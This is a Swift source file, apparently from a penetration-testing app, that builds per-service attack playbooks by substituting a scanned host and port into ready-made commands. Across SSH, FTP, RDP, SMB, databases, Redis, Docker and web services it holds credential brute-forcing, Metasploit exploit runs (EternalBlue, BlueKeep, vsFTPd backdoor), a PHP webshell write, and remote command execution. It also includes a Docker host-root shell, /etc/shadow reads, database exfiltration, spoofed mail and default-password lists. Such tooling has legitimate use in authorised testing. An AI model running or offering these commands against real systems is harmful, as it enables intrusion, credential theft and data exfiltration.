import Foundation

struct PortPlaybook {

    struct Step: Identifiable {
        let id = UUID()

        var title: String

        var command: String

        var note: String? = nil
    }

    var service: String

    var isTailored: Bool

    var summary: String

    var steps: [Step]

    var exploits: [Step]

    var evidence: [String]

    var defaultCreds: [String]

    var passwordNote: String?

    static func build(for port: OpenPort, host: String) -> PortPlaybook {
        let fallbackCommand = PortCatalog.resolvedService(for: port)?.command
        var pb = template(for: key(for: port), fallbackCommand: fallbackCommand)
        pb.service = port.service

        let product = port.productVersion ?? port.service
        let version = port.version ?? ""
        func sub(_ s: String) -> String {
            s.replacingOccurrences(of: "{host}", with: host)
             .replacingOccurrences(of: "{port}", with: "\(port.port)")
             .replacingOccurrences(of: "{product}", with: product)
             .replacingOccurrences(of: "{version}", with: version)
        }
        func subStep(_ s: Step) -> Step {
            Step(title: s.title, command: sub(s.command), note: s.note.map(sub))
        }
        pb.summary = sub(pb.summary)
        pb.steps = pb.steps.map(subStep)
        pb.exploits = pb.exploits.map(subStep)
        pb.evidence = pb.evidence.map(sub)
        pb.passwordNote = pb.passwordNote.map(sub)
        return pb
    }

    private static func key(for port: OpenPort) -> String {
        let s = port.service.lowercased()
        if s.hasPrefix("ssh")                              { return "ssh" }
        if s.contains("telnet")                            { return "telnet" }
        if s.contains("ftp")                               { return "ftp" }
        if s.contains("rdp")                               { return "rdp" }
        if s.contains("smb") || s.contains("netbios")      { return "smb" }
        if s.contains("vnc")                               { return "vnc" }
        if s.contains("winrm")                             { return "winrm" }
        if s.contains("mysql") || s.contains("mariadb")    { return "mysql" }
        if s.contains("postgres")                          { return "postgres" }
        if s.contains("mssql") || s.contains("sql server") { return "mssql" }
        if s.contains("oracle")                            { return "oracle" }
        if s.contains("mongo")                             { return "mongodb" }
        if s.contains("redis")                             { return "redis" }
        if s.contains("memcached")                         { return "memcached" }
        if s.contains("snmp")                              { return "snmp" }
        if s.contains("ldap")                              { return "ldap" }
        if s.contains("smtp")                              { return "smtp" }
        if s.contains("elastic")                           { return "elasticsearch" }
        if s.contains("docker")                            { return "docker" }
        if s.contains("http")                              { return "http" }
        return "generic"
    }

    private static func template(for key: String, fallbackCommand: String?) -> PortPlaybook {
        switch key {

        case "ssh":
            return PortPlaybook(
                service: "SSH", isTailored: true,
                summary: "Encrypted remote shell. The protocol itself is not \"cracked\" - the way in is a valid credential (password guessing) or an auth/protocol CVE for the running OpenSSH build.",
                steps: [
                    Step(title: "Audit algorithms & auth (no login)",
                         command: "ssh-audit {host} -p {port}"),
                    Step(title: "List allowed auth methods",
                         command: "nmap -p {port} --script ssh-auth-methods --script-args=\"ssh.user=root\" {host}"),
                    Step(title: "Connect",
                         command: "ssh root@{host} -p {port}",
                         note: "If it asks for a password, password auth is ON - try the creds below. \"Permission denied (publickey)\" means it is key-only and cannot be password-guessed."),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt -t 4 ssh://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Find version-specific exploits",
                         command: "searchsploit {product}",
                         note: "Matches the banner build - old OpenSSH has user-enum and auth-bypass CVEs."),
                    Step(title: "Enumerate valid users (CVE-2018-15473)",
                         command: "msfconsole -q -x \"use scanner/ssh/ssh_enumusers; set RHOSTS {host}; set RPORT {port}; set USER_FILE users.txt; run; exit\""),
                    Step(title: "Open a shell with found creds",
                         command: "msfconsole -q -x \"use scanner/ssh/ssh_login; set RHOSTS {host}; set RPORT {port}; set USERNAME root; set PASSWORD PASS; run; exit\"",
                         note: "A valid pair opens a command shell / session."),
                ],
                evidence: [
                    "Banner + version string: nc {host} {port} (record the SSH-2.0-... line)",
                    "ssh-audit output flagging weak algorithms or a named CVE (e.g. Terrapin CVE-2023-48795)",
                    "hydra line: [ssh] host: {host} login: <user> password: <pass>",
                    "Post-login proof: run `id` and `hostname`, screenshot the prompt",
                ],
                defaultCreds: ["root:root", "root:toor", "root:<blank>", "admin:admin", "ubuntu:ubuntu", "pi:raspberry"],
                passwordNote: "A password prompt means password auth is enabled. Try the defaults; for a real test point hydra/medusa at a wordlist. Keep -t 4 - SSH throttles and can lock accounts.")

        case "ftp":
            return PortPlaybook(
                service: "FTP", isTailored: true,
                summary: "File transfer, usually cleartext. Check anonymous access, guess real credentials, then look for a version-specific backdoor/RCE.",
                steps: [
                    Step(title: "Check anonymous login",
                         command: "nmap -p {port} --script ftp-anon {host}"),
                    Step(title: "Connect anonymously",
                         command: "ftp {host} {port}",
                         note: "Username: anonymous. If it lets you in, run \"ls\" then \"get <file>\"."),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt ftp://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Search for a backdoor / exploit",
                         command: "searchsploit {product}",
                         note: "vsFTPd 2.3.4 and several ProFTPD builds have public RCE."),
                    Step(title: "vsFTPd 2.3.4 backdoor (CVE-2011-2523)",
                         command: "msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {host}; run; exit\""),
                    Step(title: "ProFTPD mod_copy RCE (CVE-2015-3306)",
                         command: "nmap -p {port} --script ftp-proftpd-backdoor {host}"),
                ],
                evidence: [
                    "Anonymous directory listing (ftp {host} then `ls`)",
                    "Banner naming the product/version (proves the vulnerable build)",
                    "A shell prompt / `id` output from the backdoor module",
                ],
                defaultCreds: ["anonymous:<any email>", "ftp:ftp", "admin:admin", "root:root"],
                passwordNote: "At the \"Password:\" prompt for anonymous login, press Enter or type any email. If anonymous is refused, brute-force real accounts with hydra.")

        case "telnet":
            return PortPlaybook(
                service: "Telnet", isTailored: true,
                summary: "Cleartext remote shell - credentials travel in the open, so sniffing on the same LAN is as effective as guessing.",
                steps: [
                    Step(title: "Connect",
                         command: "telnet {host} {port}",
                         note: "Read the login banner (it often names the device/OS), then try the defaults below."),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt telnet://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Search device exploits",
                         command: "searchsploit {product}"),
                    Step(title: "Capture credentials off the wire (same LAN)",
                         command: "tcpdump -i any -A 'tcp port {port} and host {host}'",
                         note: "Telnet is unencrypted - the username and password appear in cleartext in the capture."),
                ],
                evidence: [
                    "Login banner naming the device model / OS",
                    "tcpdump/wireshark capture showing the plaintext username + password",
                    "Post-login `id` or device `enable` prompt",
                ],
                defaultCreds: ["admin:admin", "root:root", "admin:password", "root:<blank>"],
                passwordNote: "Type a username, then the password at the next prompt. On routers/IoT the vendor default is the fastest win - look up the exact model.")

        case "rdp":
            return PortPlaybook(
                service: "RDP", isTailored: true,
                summary: "Windows remote desktop. Fingerprint NLA/NTLM, check for BlueKeep, then guess credentials (watch for lockouts).",
                steps: [
                    Step(title: "Fingerprint (NTLM / host info)",
                         command: "nmap -p {port} --script rdp-ntlm-info {host}"),
                    Step(title: "Connect",
                         command: "xfreerdp /v:{host}:{port} /u:Administrator /cert:ignore",
                         note: "It prompts for the password, or add /p:'PASSWORD'. /cert:ignore accepts the self-signed cert."),
                    Step(title: "Guess credentials",
                         command: "hydra -t 1 -V -f -l Administrator -P passwords.txt rdp://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Check for BlueKeep (CVE-2019-0708)",
                         command: "nmap -p {port} --script rdp-vuln-ms12-020 {host}"),
                    Step(title: "BlueKeep RCE",
                         command: "msfconsole -q -x \"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS {host}; set RPORT {port}; run; exit\"",
                         note: "Reliability varies and it can crash the host - only on targets you are cleared to disrupt."),
                    Step(title: "Session with valid creds",
                         command: "xfreerdp /v:{host}:{port} /u:Administrator /p:'PASSWORD' /cert:ignore"),
                ],
                evidence: [
                    "rdp-ntlm-info output (domain, hostname, OS build)",
                    "nmap 'VULNERABLE' line for the CVE",
                    "Screenshot of the remote desktop after login",
                ],
                defaultCreds: ["Administrator:<blank>", "Administrator:Password1", "admin:admin"],
                passwordNote: "Enter the password when the client prompts, or pass /p:''. Keep hydra at -t 1 - parallel RDP attempts trigger account lockout quickly.")

        case "smb":
            return PortPlaybook(
                service: "SMB", isTailored: true,
                summary: "Windows file sharing. Try null/guest sessions and list shares, scan for EternalBlue, then exploit or authenticate for code execution.",
                steps: [
                    Step(title: "Enumerate (OS, shares, users)",
                         command: "enum4linux-ng -A {host}"),
                    Step(title: "List shares with a null session",
                         command: "smbclient -L //{host} -N",
                         note: "-N = no password. If shares list, connect: smbclient //{host}/SHARE -N"),
                    Step(title: "Spray credentials",
                         command: "netexec smb {host} -u users.txt -p passwords.txt"),
                ],
                exploits: [
                    Step(title: "Scan for EternalBlue (MS17-010) & others",
                         command: "nmap -p {port} --script smb-vuln-ms17-010,smb-vuln-cve-2017-7494 {host}"),
                    Step(title: "EternalBlue RCE",
                         command: "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {host}; run; exit\""),
                    Step(title: "Command execution with creds",
                         command: "netexec smb {host} -u Administrator -p 'PASSWORD' -x whoami"),
                ],
                evidence: [
                    "smbclient -L output listing shares over a null session",
                    "nmap 'VULNERABLE: Remote Code Execution (MS17-010)'",
                    "meterpreter `getuid` or netexec `whoami` output",
                ],
                defaultCreds: ["guest:<blank>", "administrator:<blank>", "admin:admin"],
                passwordNote: "A null session needs no password. If refused, spray a wordlist with netexec/crackmapexec - success prints [+] host\\\\user:pass.")

        case "vnc":
            return PortPlaybook(
                service: "VNC", isTailored: true,
                summary: "Remote desktop framebuffer. Often no password or a single weak shared one, plus a classic auth-bypass CVE.",
                steps: [
                    Step(title: "Check the auth type",
                         command: "nmap -p {port} --script vnc-info,realvnc-auth-bypass {host}"),
                    Step(title: "Connect",
                         command: "vncviewer {host}::{port}",
                         note: "If it opens with no prompt, auth is disabled and you have the desktop. Otherwise it asks for the shared password."),
                    Step(title: "Guess the password",
                         command: "hydra -P passwords.txt vnc://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Auth-bypass check (CVE-2006-2369)",
                         command: "msfconsole -q -x \"use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS {host}; set RPORT {port}; run; exit\""),
                    Step(title: "Screenshot the desktop",
                         command: "vncsnapshot {host}::{port} shot.jpg"),
                ],
                evidence: [
                    "vnc-info output showing 'None' or a weak security type",
                    "A screenshot of the connected desktop",
                ],
                defaultCreds: ["<blank>", "password", "admin"],
                passwordNote: "VNC uses one shared password and no username. Try blank first, then brute with hydra - VNC has no lockout, so it is fast.")

        case "winrm":
            return PortPlaybook(
                service: "WinRM", isTailored: true,
                summary: "Windows Remote Management - a full PowerShell shell for anyone with valid credentials. No anonymous access.",
                steps: [
                    Step(title: "Spray credentials",
                         command: "netexec winrm {host} -u users.txt -p passwords.txt"),
                    Step(title: "Get a shell",
                         command: "evil-winrm -i {host} -u Administrator -p 'PASSWORD'",
                         note: "Add -S for HTTPS (port 5986). A valid pair drops you into a PowerShell prompt."),
                ],
                exploits: [
                    Step(title: "Confirm code execution",
                         command: "netexec winrm {host} -u Administrator -p 'PASSWORD' -x whoami",
                         note: "A '[+] ... (Pwn3d!)' line means you can run commands."),
                    Step(title: "Run a payload / dump hashes",
                         command: "evil-winrm -i {host} -u Administrator -p 'PASSWORD'   # then: whoami /all"),
                ],
                evidence: [
                    "netexec '[+] domain\\\\user:pass (Pwn3d!)' line",
                    "evil-winrm PowerShell prompt + `whoami /all` output",
                ],
                defaultCreds: ["Administrator:Password1", "admin:admin"],
                passwordNote: "WinRM always needs valid Windows credentials - spray with netexec first, then hand the working pair to evil-winrm.")

        case "mysql":
            return PortPlaybook(
                service: "MySQL", isTailored: true,
                summary: "SQL database. Try root with an empty/weak password, then read data, dump password hashes, or write a webshell.",
                steps: [
                    Step(title: "Connect as root",
                         command: "mysql -h {host} -P {port} -u root",
                         note: "Press Enter at the password prompt to try an empty password (a common misconfig). If in: SHOW DATABASES;"),
                    Step(title: "Fingerprint / empty-password check",
                         command: "nmap -p {port} --script mysql-info,mysql-empty-password {host}"),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt mysql://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Dump users & password hashes",
                         command: "mysql -h {host} -P {port} -u root -e 'SELECT user,authentication_string FROM mysql.user;'"),
                    Step(title: "Exfiltrate a whole database",
                         command: "mysqldump -h {host} -P {port} -u root --all-databases > dump.sql"),
                    Step(title: "Write a webshell (FILE priv + writable webroot)",
                         command: "mysql -h {host} -P {port} -u root -e \"SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/sh.php'\""),
                ],
                evidence: [
                    "SHOW DATABASES; output listing the schemas",
                    "Row dump from mysql.user (usernames + hashes)",
                    "The empty/weak-password login succeeding",
                ],
                defaultCreds: ["root:<blank>", "root:root", "root:password", "admin:admin"],
                passwordNote: "At \"Enter password:\" press Enter for an empty password first - that alone is a finding. Otherwise guess with hydra, then dump/exfiltrate.")

        case "postgres":
            return PortPlaybook(
                service: "PostgreSQL", isTailored: true,
                summary: "SQL database. Try the postgres superuser with a weak password, then read local files or get command execution via COPY.",
                steps: [
                    Step(title: "Connect",
                         command: "psql -h {host} -p {port} -U postgres",
                         note: "Script it with: PGPASSWORD=postgres psql -h {host} -p {port} -U postgres"),
                    Step(title: "List databases (once in)",
                         command: "psql -h {host} -p {port} -U postgres -c '\\l'"),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt postgres://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Command execution (COPY ... PROGRAM, 9.3+)",
                         command: "psql -h {host} -p {port} -U postgres -c \"COPY (SELECT '') TO PROGRAM 'id'\""),
                    Step(title: "Read a local file",
                         command: "psql -h {host} -p {port} -U postgres -c \"CREATE TABLE x(t text); COPY x FROM '/etc/passwd'; SELECT * FROM x\""),
                    Step(title: "Metasploit exec module",
                         command: "msfconsole -q -x \"use exploit/multi/postgres/postgres_copy_from_program_cmd_exec; set RHOSTS {host}; set RPORT {port}; run; exit\""),
                ],
                evidence: [
                    "\\l database listing",
                    "COPY ... PROGRAM output (proof of command execution)",
                    "/etc/passwd contents read back via COPY",
                ],
                defaultCreds: ["postgres:postgres", "postgres:<blank>", "postgres:password"],
                passwordNote: "Set PGPASSWORD to skip the prompt. Once in, \"\\l\" lists databases and \"\\c dbname\" switches into one.")

        case "mssql":
            return PortPlaybook(
                service: "MSSQL", isTailored: true,
                summary: "Microsoft SQL Server. The classic win is sa with a blank/weak password, then xp_cmdshell for OS command execution.",
                steps: [
                    Step(title: "Info / empty-password check",
                         command: "nmap -p {port} --script ms-sql-info,ms-sql-empty-password {host}"),
                    Step(title: "Connect as sa",
                         command: "impacket-mssqlclient sa@{host} -port {port}",
                         note: "Prompts for the sa password. Try blank/weak first."),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt mssql://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Enable & run xp_cmdshell",
                         command: "impacket-mssqlclient sa:'PASSWORD'@{host} -port {port}",
                         note: "At the SQL> prompt: enable_xp_cmdshell then xp_cmdshell whoami"),
                    Step(title: "Metasploit command exec",
                         command: "msfconsole -q -x \"use admin/mssql/mssql_exec; set RHOSTS {host}; set RPORT {port}; set PASSWORD PASS; set CMD whoami; run; exit\""),
                ],
                evidence: [
                    "ms-sql-info / empty-password nmap output",
                    "xp_cmdshell whoami returning a Windows account (e.g. nt authority\\system)",
                ],
                defaultCreds: ["sa:<blank>", "sa:sa", "sa:Password1"],
                passwordNote: "sa with a blank or weak password is the classic finding. After login, enable_xp_cmdshell in impacket, then EXEC xp_cmdshell to run OS commands.")

        case "oracle":
            return PortPlaybook(
                service: "Oracle DB", isTailored: true,
                summary: "Oracle needs a SID/service name before login - brute that, then default accounts, then ODAT for file read / RCE.",
                steps: [
                    Step(title: "Brute-force the SID",
                         command: "nmap -p {port} --script oracle-sid-brute {host}"),
                    Step(title: "Guess account credentials",
                         command: "nmap -p {port} --script oracle-brute --script-args oracle-brute.sid=XE {host}"),
                    Step(title: "Connect",
                         command: "sqlplus system/oracle@{host}:{port}/XE"),
                ],
                exploits: [
                    Step(title: "All-in-one (SID, creds, privesc, RCE)",
                         command: "odat all -s {host} -p {port}",
                         note: "ODAT automates SID discovery, credential brute, file read/write and command execution."),
                    Step(title: "Version exploits",
                         command: "searchsploit oracle {version}"),
                ],
                evidence: [
                    "The discovered SID / service name",
                    "A valid account:password pair",
                    "odat output showing file read or command execution",
                ],
                defaultCreds: ["system:oracle", "sys:change_on_install", "scott:tiger", "dbsnmp:dbsnmp"],
                passwordNote: "Replace XE with the SID you found. Log in as user/password@{host}:{port}/SID; sqlplus asks for the password if you omit it.")

        case "mongodb":
            return PortPlaybook(
                service: "MongoDB", isTailored: true,
                summary: "Document database - older/default deployments require no authentication, so every database is readable and exportable.",
                steps: [
                    Step(title: "Connect (no auth)",
                         command: "mongosh \"mongodb://{host}:{port}\"",
                         note: "If the shell opens without asking for anything, run \"show dbs\". An auth error means credentials are required."),
                    Step(title: "Guess credentials",
                         command: "hydra -L users.txt -P passwords.txt mongodb://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "Dump every database name",
                         command: "mongosh \"mongodb://{host}:{port}\" --quiet --eval 'db.getMongo().getDBNames()'"),
                    Step(title: "Exfiltrate a collection",
                         command: "mongoexport --host {host} --port {port} --db DB --collection COLL --out dump.json"),
                ],
                evidence: [
                    "show dbs output over an unauthenticated connection",
                    "Exported JSON documents (dump.json)",
                ],
                defaultCreds: ["<no auth>", "admin:admin", "root:root"],
                passwordNote: "Unauthenticated Mongo needs no password - just \"show dbs\". If auth is on, retry with mongosh \"mongodb://user:pass@{host}:{port}\".")

        case "redis":
            return PortPlaybook(
                service: "Redis", isTailored: true,
                summary: "In-memory store - default builds have no auth, which leaks all data and frequently leads to remote code execution.",
                steps: [
                    Step(title: "Connect & check auth",
                         command: "redis-cli -h {host} -p {port}",
                         note: "Then type INFO. A normal reply = wide open; \"NOAUTH Authentication required\" = a password is set."),
                    Step(title: "Dump keys (if open)",
                         command: "redis-cli -h {host} -p {port} --scan"),
                    Step(title: "Guess the password",
                         command: "hydra -P passwords.txt redis://{host}:{port}"),
                ],
                exploits: [
                    Step(title: "SSH-key write RCE (if unauth)",
                         command: "redis-cli -h {host} -p {port} CONFIG SET dir /root/.ssh/",
                         note: "Then set dbfilename to authorized_keys, SET a key holding your padded SSH public key, and SAVE - now SSH in as root."),
                    Step(title: "Automated RCE (module / cron / SSH)",
                         command: "git clone https://github.com/n0b0dyCN/redis-rogue-server && python3 redis-rogue-server/redis-rogue-server.py --rhost {host} --rport {port}"),
                ],
                evidence: [
                    "INFO returning full server data with no AUTH",
                    "CONFIG GET dir succeeding (proves write access to config)",
                    "SSH login as root using the injected key",
                ],
                defaultCreds: ["<no password>", "foobared", "password", "redis"],
                passwordNote: "Redis has no username - only an optional password via AUTH. If INFO returns NOAUTH, guess it with hydra, then connect: redis-cli -h {host} -p {port} -a <pass>.")

        case "memcached":
            return PortPlaybook(
                service: "Memcached", isTailored: true,
                summary: "Cache with no authentication - if it answers, everything cached is readable. Also a strong UDP reflection/DDoS amplifier.",
                steps: [
                    Step(title: "Dump stats & item metadata",
                         command: "printf 'stats\\r\\nstats items\\r\\n' | nc {host} {port}"),
                    Step(title: "List keys",
                         command: "memcdump --servers={host}:{port}"),
                ],
                exploits: [
                    Step(title: "Read cached values (often session tokens)",
                         command: "memcdump --servers={host}:{port}",
                         note: "For each key printed, read it: printf 'get <key>\\r\\n' | nc {host} {port}"),
                    Step(title: "Check UDP amplification exposure",
                         command: "nmap -sU -p {port} --script memcached-info {host}"),
                ],
                evidence: [
                    "stats output (proves it answers unauthenticated)",
                    "Cached values containing app data / session tokens",
                ],
                defaultCreds: [],
                passwordNote: nil)

        case "snmp":
            return PortPlaybook(
                service: "SNMP", isTailored: true,
                summary: "Device management - frequently readable with a default \"community string\" that leaks the whole configuration, users and processes.",
                steps: [
                    Step(title: "Try the default community",
                         command: "snmpwalk -v2c -c public {host}"),
                    Step(title: "Guess the community string",
                         command: "onesixtyone -c communities.txt {host}"),
                ],
                exploits: [
                    Step(title: "Extract everything (snmp-check)",
                         command: "snmp-check -c public {host}"),
                    Step(title: "Grab Windows users / running processes",
                         command: "snmpwalk -v2c -c public {host} 1.3.6.1.4.1.77.1.2.25"),
                ],
                evidence: [
                    "snmpwalk succeeding with the default community",
                    "snmp-check output disclosing system/user/process info",
                ],
                defaultCreds: ["public (read)", "private (read/write)", "community", "manager"],
                passwordNote: "SNMP's \"password\" is the community string. \"public\" and \"private\" are the classic defaults; onesixtyone brute-forces the rest from a list.")

        case "ldap":
            return PortPlaybook(
                service: "LDAP", isTailored: true,
                summary: "Directory service - many allow an anonymous bind that dumps users, groups and sometimes password/secret attributes.",
                steps: [
                    Step(title: "Anonymous bind + base info",
                         command: "ldapsearch -x -H ldap://{host}:{port} -s base -b ''"),
                    Step(title: "Dump the directory (anonymous)",
                         command: "ldapsearch -x -H ldap://{host}:{port} -b 'DC=example,DC=com'"),
                ],
                exploits: [
                    Step(title: "Dump every object",
                         command: "ldapsearch -x -H ldap://{host}:{port} -b 'DC=example,DC=com' '(objectClass=*)'"),
                    Step(title: "Hunt for secrets in attributes",
                         command: "ldapsearch -x -H ldap://{host}:{port} -b 'DC=example,DC=com' | grep -iE 'userpassword|pwd|secret|description'"),
                ],
                evidence: [
                    "Anonymous bind returning directory entries",
                    "Any userPassword / description-stored secrets",
                ],
                defaultCreds: ["anonymous bind (no -D/-w)"],
                passwordNote: "Try with no -D/-w first (anonymous). If a bind is required, add -D 'cn=admin,dc=example,dc=com' -w PASSWORD.")

        case "smtp":
            return PortPlaybook(
                service: "SMTP", isTailored: true,
                summary: "Mail transfer - the goal is user enumeration and testing for an open relay you can abuse to spoof/spam.",
                steps: [
                    Step(title: "Banner + supported verbs",
                         command: "nc {host} {port}",
                         note: "Then type: EHLO x - look for VRFY/EXPN and relay support."),
                    Step(title: "Enumerate users",
                         command: "smtp-user-enum -M VRFY -U users.txt -t {host} -p {port}"),
                ],
                exploits: [
                    Step(title: "Test for an open relay",
                         command: "nmap -p {port} --script smtp-open-relay {host}"),
                    Step(title: "Send a spoofed mail (if relay open)",
                         command: "swaks --to victim@example.com --from ceo@target.com --server {host}:{port}"),
                ],
                evidence: [
                    "smtp-open-relay 'Server is an open relay' line",
                    "VRFY/RCPT 250 responses confirming valid users",
                    "A delivered spoofed message",
                ],
                defaultCreds: [],
                passwordNote: nil)

        case "elasticsearch":
            return PortPlaybook(
                service: "Elasticsearch", isTailored: true,
                summary: "Search cluster - default/older builds need no auth, so indices are readable over plain HTTP; old versions have RCE.",
                steps: [
                    Step(title: "List indices (no auth)",
                         command: "curl http://{host}:{port}/_cat/indices?v"),
                    Step(title: "Cluster health / version",
                         command: "curl http://{host}:{port}/"),
                ],
                exploits: [
                    Step(title: "Version RCE search (CVE-2015-1427, CVE-2014-3120)",
                         command: "searchsploit elasticsearch {version}"),
                    Step(title: "Dump an index to disk",
                         command: "curl \"http://{host}:{port}/INDEX/_search?size=1000&pretty\" -o dump.json"),
                ],
                evidence: [
                    "_cat/indices listing without authentication",
                    "Exported documents (dump.json)",
                ],
                defaultCreds: ["<no auth>", "elastic:changeme", "elastic:elastic"],
                passwordNote: "If a request returns 401, auth is on - add -u elastic:PASSWORD and guess the password.")

        case "docker":
            return PortPlaybook(
                service: "Docker API", isTailored: true,
                summary: "An exposed Docker Engine API on plain TCP is unauthenticated root-equivalent control of the host.",
                steps: [
                    Step(title: "Confirm access",
                         command: "docker -H tcp://{host}:{port} version"),
                    Step(title: "List containers & images",
                         command: "docker -H tcp://{host}:{port} ps -a"),
                ],
                exploits: [
                    Step(title: "Root shell on the host",
                         command: "docker -H tcp://{host}:{port} run -v /:/host -it alpine chroot /host sh",
                         note: "Mounting / into a container and chroot-ing gives a root shell on the host itself."),
                    Step(title: "Read a host secret",
                         command: "docker -H tcp://{host}:{port} run -v /:/host alpine cat /host/etc/shadow"),
                ],
                evidence: [
                    "docker version / ps answering with no TLS",
                    "/etc/shadow (or another host file) read from inside a container",
                ],
                defaultCreds: [],
                passwordNote: "No password: the plain-TCP Docker API has no authentication. If the port needs TLS certs (2376) it is the hardened variant instead.")

        case "http":
            return PortPlaybook(
                service: "HTTP", isTailored: true,
                summary: "Web service - enumerate content and tech, scan for known CVEs, then exploit the app or its login.",
                steps: [
                    Step(title: "Headers & tech",
                         command: "curl -sI http://{host}:{port}/"),
                    Step(title: "Directory brute-force",
                         command: "feroxbuster -u http://{host}:{port}/ -w /usr/share/wordlists/dirb/common.txt"),
                    Step(title: "Brute a login form / basic-auth",
                         command: "hydra {host} -s {port} -L users.txt -P passwords.txt http-get /"),
                ],
                exploits: [
                    Step(title: "Scan for known CVEs (templated)",
                         command: "nuclei -u http://{host}:{port}/"),
                    Step(title: "Server/app version exploits",
                         command: "searchsploit {product}"),
                    Step(title: "Web misconfig / vuln scan",
                         command: "nikto -h http://{host}:{port}/"),
                ],
                evidence: [
                    "curl -sI headers naming the server/framework/version",
                    "nuclei/nikto findings with the matching CVE id",
                    "A working PoC request and its response",
                ],
                defaultCreds: ["admin:admin", "admin:password", "tomcat:tomcat"],
                passwordNote: "For an HTTP Basic-Auth popup use the http-get hydra module above. For an HTML login form, use http-post-form and point it at the form's fields.")

        default:
            var steps: [Step] = [
                Step(title: "Identify the service & version",
                     command: "nmap -sV -p {port} {host}"),
            ]
            if let cmd = fallbackCommand {
                steps.append(Step(title: "Interact", command: cmd))
            } else {
                steps.append(Step(title: "Grab the banner",
                                  command: "nc {host} {port}",
                                  note: "Send a newline or an HTTP request and read what comes back to fingerprint it."))
            }
            return PortPlaybook(
                service: "Service", isTailored: false,
                summary: "No tailored playbook for this service - identify it precisely, then pick tooling for whatever it turns out to be.",
                steps: steps,
                exploits: [
                    Step(title: "Search Exploit-DB by version",
                         command: "searchsploit {product}"),
                    Step(title: "Run known-vuln NSE scripts",
                         command: "nmap -p {port} --script vuln {host}"),
                ],
                evidence: [
                    "nmap -sV service + version banner",
                    "Any nmap 'VULNERABLE' lines from the vuln scripts",
                ],
                defaultCreds: [],
                passwordNote: nil)
        }
    }
}
